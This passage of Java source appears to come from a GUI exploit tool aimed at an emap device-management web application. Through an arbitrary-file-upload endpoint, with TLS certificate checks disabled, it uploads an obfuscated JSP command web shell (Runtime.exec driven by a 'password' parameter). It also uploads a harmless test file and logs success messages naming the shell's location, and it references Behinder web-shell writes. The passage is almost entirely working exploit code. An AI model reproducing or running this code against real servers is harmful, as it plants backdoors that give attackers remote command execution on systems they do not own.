               // cmd1.appendText(formattedDateTime + response.toString() + "\n");


            } else {

                cmd1.appendText(formattedDateTime + "冰蝎写入失败" + url + "\n");
                //   cmd1.appendText(formattedDateTime + response.toString() + "\n");
            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "冰蝎写入失败-" + url + "\n");
        }


    }

    public void emap3(){

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/devicePoint_addImgIco?hasSubsystem=true");
            HttpURLConnection con = (HttpURLConnection) url1.openConnection();
            con.setRequestMethod("POST");
            con.setDoOutput(true);
            String boundary = "A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT";
            String postData = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"upload\"; filename=\"1ndex2.jsp\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "Content-Transfer-Encoding: binary\r\n\r\n" +
                    "<%  Class<?> CcK2 = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));java.lang.reflect.Method EPlvD393 = CcK2.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);Object GKmB5mMt = EPlvD393.invoke( CcK2.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{request.getParameter(\"password\")});java.lang.reflect.Method QE7E = GKmB5mMt.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));QE7E.setAccessible(true);java.util.Scanner s = new java.util.Scanner((java.io.InputStream) QE7E.invoke(GKmB5mMt, new Object[]{})).useDelimiter(\"A\");String result = s.hasNext() ? s.next() : \"\";out.print(\"<pre>\");out.print(result);out.print(\"</pre>\"); %>\r\n" +
                    "--" + boundary + "--";

            con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                wr.write(postData.getBytes());
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }

            int responseCode = con.getResponseCode();
            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String aa=jsonObject.getString("data");

            if (response.toString().contains("data")) {

                cmd1.appendText(formattedDateTime + "jspcmdshell写入成功" + url +":8314"+ "/upload/emap/society_new" +"/"+aa+ "密码password"+"\n");
               // cmd1.appendText(formattedDateTime + response.toString() + "\n");


            } else {

                cmd1.appendText(formattedDateTime + "jspcmdshell写入失败" + url + "\n");
                //   cmd1.appendText(formattedDateTime + response.toString() + "\n");
            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "jspcmdshell写入失败-" + url + "\n");
        }
    }

    public void emap4(){

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/devicePoint_addImgIco?hasSubsystem=true");
            HttpURLConnection con = (HttpURLConnection) url1.openConnection();
            con.setRequestMethod("POST");
            con.setDoOutput(true);
            String boundary = "A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT";
            String postData = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"upload\"; filename=\"1ndex2.jsp\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "Content-Transfer-Encoding: binary\r\n\r\n" +
                    "Test files hello ≥Ö‿Ö≤\r\n" +
                    "--" + boundary + "--";

            con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                wr.write(postData.getBytes());
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }

            int responseCode = con.getResponseCode();
            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String aa=jsonObject.getString("data");

            if (response.toString().contains("data")) {

                cmd1.appendText(formattedDateTime + "测试文件写入成功" + url +":8314"+ "/upload/emap/society_new"+"/"+aa+"\n");
              //  cmd1.appendText(formattedDateTime + response.toString() + "\n");


            } else {

                cmd1.appendText(formattedDateTime + "测试文件写入失败" + url + "\n");
                //   cmd1.appendText(formattedDateTime + response.toString() + "\n");
            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "测试文件写入失败-" + url + "\n");
        }
    }

}

